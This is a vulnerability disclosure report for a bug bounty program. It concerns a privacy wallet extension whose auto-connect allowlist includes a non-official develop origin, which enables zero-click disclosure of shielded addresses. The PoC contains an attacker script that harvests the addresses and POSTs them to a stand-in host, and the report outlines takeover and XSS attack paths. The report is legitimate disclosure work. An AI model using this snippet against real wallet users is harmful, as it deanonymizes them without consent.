# HackenProof submission — Noir Wallet

> Copy-paste ready. Fields map to the program's required submission fields (title, affected component, version/commit, description, steps, PoC, impact, prerequisites, severity justification, remediation). Submit privately via HackenProof.

---

**Title:** Privileged dApp auto-connect allowlist ships a non-official, takeover-prone "develop" origin — zero-click connection-consent bypass and silent disclosure of every account's shielded address

**Severity:** High *(Critical if the program confirms the origin is attacker-controllable — see Severity justification)*

**Affected component:** `NoirWallet/noir-wallet` — browser extension. Primary: `packages/extension/src/core/dapp/first-party-policy.ts`. Consumers: `packages/extension/src/background/dapp-handler.ts`, `packages/extension/src/core/dapp/dapp-manager.ts`.

**Version / commit:** Extension `2.0.0` (manifest name "Noir Wallet"); source at `noir-wallet@6b91c8d` (current `main` HEAD at time of report). Confirmed present in a clean production `vite build` output.

**Vulnerability class:** CWE-863 Incorrect Authorization / CWE-284 Improper Access Control (with CWE-200 exposure of protected information).

---

### Summary
The extension hard-codes a "first-party" allowlist of origins that are auto-connected to the wallet **without any user approval**. Besides the official `https://app.zknoir.com`, the list contains `https://noirdevelop.refburrow.top` — a non-NoirWallet-branded `.top` domain that resolves (CNAME) to a Cloudflare Pages **develop** deployment (`noir-dashboard-develop.pages.dev`). Any page served from that origin can, with zero user interaction, make the wallet authorize **every account of every wallet** and return their **transparent and shielded** addresses. For a privacy-focused Zcash wallet, silent disclosure of shielded addresses is a deanonymization of the product's core protected secret, and granting production auto-connect to a low-assurance, takeover-prone staging origin is a severe expansion of the wallet's trust boundary.

### Root cause
```ts
// packages/extension/src/core/dapp/first-party-policy.ts
const AUTO_CONNECT_DAPP_ORIGINS: ReadonlySet<string> = new Set([
  'https://app.zknoir.com',
  'https://noirdevelop.refburrow.top'   // non-official, .top, CNAME -> *.pages.dev (develop)
])
export function shouldAutoConnectDApp(origin: string): boolean {
  return AUTO_CONNECT_DAPP_ORIGINS.has(origin)
}
```
Origins in this set bypass the connection-consent UI and receive full account authorization automatically, plus an elevated session-scope limit (64 vs 16).

**Provenance note:** `first-party-policy.ts` was created in commit `6b91c8d`, whose message is *"fix(rpc): support Zcash Testnet registry and custom endpoints (#87)"* — a security-critical privileged-origin allowlist introduced inside an unrelated RPC commit.

### Prerequisites
- The wallet is unlocked (active unlock session — the normal browsing state), with the beta activated (dApp features require one-time beta activation; this is the intended user state for the promoted beta).
- The victim's browser loads a page served from `https://noirdevelop.refburrow.top`.
- No clicks, no approval prompt.

### Steps to reproduce / code path
1. A page at the allowlisted origin calls, on load, `window.noirwallet.zcash.requestAccounts()` (or `getAccounts()`).
2. Background `dapp-handler.ts` `requestAccounts` (`:491-492`): `if (shouldAutoConnectDApp(origin) && canAutoConnect(origin)) chosen = await this.authorizeAllWalletAccounts(origin)` — the approval-window branch is skipped. (`getAccounts` `:377-382` and `ensurePermission` `:1985-1988` take the same auto-authorize branch.)
3. `canAutoConnect` (`dapp-manager.ts:1279-1283`) returns `true` for a never-before-seen origin (state `undefined`), so the first visit succeeds.
4. `authorizeAllWalletAccounts` (`dapp-handler.ts:738+`) → `buildAllWalletAccounts()` authorizes **every account of every wallet** and returns `{ transparent, shielded, accounts[] }`.

### Proof of concept (evidence produced)
1. **Real shipped policy module (executed):** running `packages/extension/src/core/dapp/first-party-policy.ts` returns `shouldAutoConnectDApp('https://noirdevelop.refburrow.top') === true` and session-scope limit `64` (vs `16` for a normal site); a random attacker origin returns `false`.
2. **Production build (executed):** a clean `pnpm install && vite build` (the Zcash WASM is vendored, so no Rust toolchain is required) yields `dist/assets/runtime-message-security-*.js` containing verbatim:
   ```js
   Set(["https://app.zknoir.com","https://noirdevelop.refburrow.top"]);
   ```
   i.e., the rogue origin ships in the production bundle (`Noir Wallet` v2.0.0) and is **not** behind a dev/test flag.
3. **Attacker page (for a live demo by the triager):**
   ```html
   <script>
     const r = await window.noirwallet.zcash.requestAccounts(); // no approval dialog
     // r.shielded / r.transparent / r.accounts[] returned with zero user interaction
     fetch('https://attacker.example/collect', {method:'POST', body: JSON.stringify(r)});
   </script>
   ```
4. **DNS (passive, no traffic sent to the host):** `noirdevelop.refburrow.top` → CNAME `noir-dashboard-develop.pages.dev` (Cloudflare); apex `refburrow.top` → `172.104.172.238`.

### Expected vs actual behavior
- **Expected:** the wallet shows a connection-approval dialog and discloses addresses only after the user approves, and only for the selected account(s).
- **Actual:** for an allowlisted origin, no dialog is shown and **all** accounts' transparent + shielded addresses are disclosed automatically.

### Security impact
- Connection-consent boundary fully bypassed for the allowlisted origin (severe wallet-boundary compromise).
- Silent deanonymization: every account's shielded address — the wallet's core protected secret — disclosed to a web origin with no user action. (Shielded addresses are "additional protected information," distinct from public blockchain data.)
- Blast radius = all users whose wallet is activated/unlocked (the intended state). Signing/fund-movement still requires the approval UI, so this is silent **connection + address disclosure**, not silent transfer.

### Attack scenarios (why the domain is the problem)
1. **Dangling-CNAME / subdomain takeover:** a custom domain CNAME'd to a Cloudflare Pages project; if the "develop" Pages project is renamed/deleted, an attacker claims the project name and controls a privileged auto-connect origin.
2. **Domain lapse:** `refburrow.top` is outside NoirWallet's primary branding; if it expires/changes hands, the new owner inherits auto-connect privilege.
3. **XSS on the develop deployment:** staging environments are typically lower-assurance; a single XSS on `noirdevelop.refburrow.top` yields zero-click wallet connection + shielded-address exfiltration for all production users — no takeover required.

### Severity justification
Rated **High** as the defensible baseline: a low-assurance, non-production, structurally takeover-prone origin holds production auto-connect privilege, and exploitation yields zero-click disclosure of every user's protected shielded addresses (deanonymization) — a core-threat-model breach for a privacy wallet. It rises to **Critical** ("severe wallet-boundary compromise") upon any of: demonstrated attacker control of the origin (Cloudflare Pages project takeover or domain lapse) or an XSS on the develop deployment. I do not assert the origin is attacker-controlled today (it currently resolves to live infrastructure); the program is best positioned to confirm ownership and takeover-resistance, which sets the final rating. Current real-world exposure is limited to beta-activated installs — a mitigant, but activation is the intended user flow.

### Remediation
1. Remove `https://noirdevelop.refburrow.top` from the production allowlist; never ship develop/staging origins with production auto-connect. Gate any dev auto-connect behind a dev build flag (as already done for conformance RPCs / EVM dev-server behavior).
2. Audit the Cloudflare Pages custom-domain for dangling-CNAME/takeover exposure; remove stale custom-domain CNAMEs.
3. Require CODEOWNERS/security review for `first-party-policy.ts`; investigate how this entry entered via an unrelated `fix(rpc)` commit.
4. Consider requiring an explicit one-time user consent even for first-party origins, so no origin connects fully silently.
